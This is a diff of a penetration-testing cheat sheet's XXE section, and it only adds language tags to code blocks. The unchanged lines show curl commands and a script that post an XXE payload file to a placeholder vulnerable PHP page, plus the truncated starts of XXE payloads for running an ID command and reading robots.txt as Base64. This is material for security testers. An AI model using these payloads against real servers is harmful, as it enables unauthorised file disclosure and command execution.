@@ -331,7 +331,7 @@ But after replacing character with ? you may receive a successful response (200)
 {% tab title="XXE" %}
 Send Post request with path to xml file for exploitation
 
-```
+```bash
 curl -d@/home/researcher/Desktop/payloads/poc.xml http://vulnerablesite.com/home/vulnerable.php
 ```
 
@@ -340,7 +340,7 @@ Use a script to send payload:\
 \
 curl.sh
 
-```
+```bash
 #!/bin/bash
 curl -d@/home/researcher/Desktop/payloads/poc.xml http://vulnerablesite.com/home/vulnerable.php
 ```
@@ -349,7 +349,7 @@ curl -d@/home/researcher/Desktop/payloads/poc.xml http://vulnerablesite.com/home
 
 ID.xml
 
-```
+```xml
 <!--ID command example-->
 <?xml version="1.0"?>
 <!DOCTYPE foo [
@@ -365,7 +365,7 @@ ID.xml
 
 Read Robots.txt (Base 64)
 
-```
+```xml
 <!--Base64 response example-->
 <?xml version="1.0"?>
 <!DOCTYPE foo [
